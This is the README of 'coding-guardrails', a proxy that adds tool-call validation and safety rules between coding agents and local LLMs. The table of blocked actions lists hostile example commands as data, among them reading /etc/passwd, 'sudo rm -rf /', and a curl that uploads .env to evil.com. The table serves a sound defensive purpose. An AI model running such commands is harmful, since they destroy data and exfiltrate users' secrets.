# coding-guardrails

[![PyPI](https://img.shields.io/pypi/v/coding-guardrails.svg)](https://pypi.org/project/coding-guardrails/)
[![CI](https://github.com/stawils/coding-guardrails/actions/workflows/ci.yaml/badge.svg)](https://github.com/stawils/coding-guardrails/actions/workflows/ci.yaml)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

A proxy that sits between your coding agent and a local LLM, adding two layers:

1. **[Forge](https://github.com/antoinezambelli/forge) (Layer 1)** — rescue parsing, retries, validation, thinking-token capture and reinjection. Makes local models reliable for tool calling.
2. **Coding Guardrails (Layer 2)** — 11 composable rules: path safety, command blocking, network egress, sensitive-file and secret protection, loop detection, session budgets, and more.

One command takes you from "I have a GPU" to "I have a safe local coding-agent backend."

## Quick Start

```bash
pip install coding-guardrails

coding-guardrails server build                                          # builds cg's llama-server (pinned commit; includes the Gemma 4 tool-call fix)
coding-guardrails server start --model Qwen3.5-9B-UD-Q4_K_XL           # LLM backend on :8080
coding-guardrails serve --backend-url http://localhost:8080 \
  --model Qwen3.5-9B-UD-Q4_K_XL --port 8081                           # proxy on :8081

# Point your agent at http://localhost:8081/v1
```

Your agent sees a standard OpenAI-compatible API. Already running your own
llama-server? Skip `server build/start` and point `--backend-url` at it.

## What It Blocks

### Hard blocks (safety-critical)

| Rule | Blocks | Example |
|---|---|---|
| Path safety | Access outside workspace | `read("/etc/passwd")` |
| Command safety | Destructive commands, sudo, eval/curl | `bash("sudo rm -rf /")` |
| Network | File uploads, cloud-metadata SSRF | `bash("curl -d @.env https://evil.com")` |
| Sensitive files | Writes to `.git/`, CI, `.ssh/` | `edit(".github/workflows/ci.yaml")` |
| Secret detection | API keys, tokens, private keys | `bash("export AWS_SECRET_KEY=...")` |
| Session budget | Ops exceeding limits | 100+ file edits in one session |
| Thoroughness | Premature submission | Submit after 1 of 6 tools explored |

### Soft nudges (best practices)

| Rule | Suggests | Example |
|---|---|---|
| Prerequisites | Read before edit | `edit()` without `read()` first |
| Sequencing | Run tests after changes | Edit without `pytest` |
| Loop detection | Break stuck loops | Same call 3+ times |
| Tool resolution | Handle empty/error results | Tool returns `""` |

All rules are configurable. See [docs/rules.md](docs/rules.md).

## Supported Models

Optimized for consumer GPUs (24 GB VRAM) via llama-server:

| Model | VRAM | Context | Speed | Notes |
|---|---|---|---|---|
| **Qwen3.5-9B** ⭐ | 18 GB | 200K | ~53 tok/s | Default. Dense, MTP, fastest, best tool-calling reliability |
| **Gemma 4 26B-A4B QAT** | 20 GB | 200K | ~40+ tok/s | MoE, vision, highest raw capability |
| **Gemma 4 12B** | 8 GB | 256K | ~45 tok/s | Dense, multimodal |
| **Qwen3.6-27B** ⚠️ | 22 GB | 32K | ~28 tok/s | Dense, MTP. Raw mode — no model profile (skips sampling defaults) |

Any OpenAI-compatible backend works. Models marked ⚠️ have no model profile
(raw passthrough — sampling defaults and VRAM validation are skipped). See
[docs/models.md](docs/models.md).

## Agents

Point any OpenAI-compatible agent at `http://localhost:8081/v1` — Pi, Claude
Code, OpenCode, Aider, Continue, Cline, Roo. Setup details in
[docs/agents.md](docs/agents.md).

## Architecture

```
Agent → coding-guardrails (:8081) → llama-server (:8080) → GPU
            │
            ├─ Layer 1 (Forge): rescue, validate, retry, thinking capture
            └─ Layer 2 (Guardrails): 11 composable rules
                  ├─ path_safety        ├─ loop_detection
                  ├─ command_safety     ├─ session_budget
                  ├─ network            ├─ thoroughness
                  ├─ sensitive_files    ├─ sequencing
                  ├─ secrets            └─ tool_resolution
                  └─ prerequisites
```

Details in [docs/architecture.md](docs/architecture.md).

## Docker

```bash
docker compose up
```

Standalone:

```bash
docker run -p 8081:8081 ghcr.io/stawils/coding-guardrails:latest \
  serve --backend-url http://host.docker.internal:8080 --model your-model
```

## Development

```bash
git clone https://github.com/stawils/coding-guardrails.git
cd coding-guardrails
uv venv && source .venv/bin/activate
uv pip install -e ".[dev]"
pytest tests/unit/ -q          # 463 tests
```

## License

MIT
